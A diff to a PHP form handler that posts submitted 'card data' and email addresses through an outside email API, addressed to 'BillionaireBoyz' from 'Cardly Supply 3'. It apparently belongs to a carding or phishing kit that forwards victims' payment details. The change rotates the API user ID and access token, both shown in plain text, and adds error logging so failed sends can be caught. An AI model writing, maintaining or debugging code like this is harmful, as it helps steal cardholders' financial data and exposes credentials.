@@ -68,8 +68,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $data = json_encode([
         "service_id" => "service_t84qq3v",
         "template_id" => "template_l1dza9m",
-        "user_id" => "-GXR5-vheoKdhIIH4",
-        "accessToken" => "sMjA-i0fQ9-tjs4HYIm4L",
+        "user_id" => "oIOF3r-xiKrb05r96",
+        "accessToken" => "F8FPZZ9SYQf9letjY-re_",
         "template_params" => [
             "to_name" => "BillionaireBoyz",
             "from_name" => "Cardly Supply 3",
@@ -80,7 +80,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
 
     $resp = curl_exec($curl);
+    $err = curl_error($curl);
+    $http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
     curl_close($curl);
+
+    if ($resp === false || $http_code >= 400) {
+        error_log("Card data send error: HTTP $http_code - $err - Response: $resp");
+    }
 
     // --- Send only the email to the same endpoint but with different data ---
     if (!empty($email)) {
@@ -93,8 +99,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $email_data = json_encode([
             "service_id" => "service_t84qq3v",
             "template_id" => "template_brtd0x7",
-            "user_id" => "-GXR5-vheoKdhIIH4",
-            "accessToken" => "sMjA-i0fQ9-tjs4HYIm4L",
+            "user_id" => "oIOF3r-xiKrb05r96",
+            "accessToken" => "F8FPZZ9SYQf9letjY-re_",
             "template_params" => [
                 "to_name" => "BillionaireBoyz",
                 "from_name" => "Cardly Supply 3",
@@ -104,8 +110,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         curl_setopt($curl2, CURLOPT_POSTFIELDS, $email_data);
 
-        curl_exec($curl2);
+        $resp2 = curl_exec($curl2);
+        $err2 = curl_error($curl2);
+        $http_code2 = curl_getinfo($curl2, CURLINFO_HTTP_CODE);
         curl_close($curl2);
+
+        if ($resp2 === false || $http_code2 >= 400) {
+            error_log("Email send error: HTTP $http_code2 - $err2 - Response: $resp2");
+        }
     }
 
     if ($resp === false) {
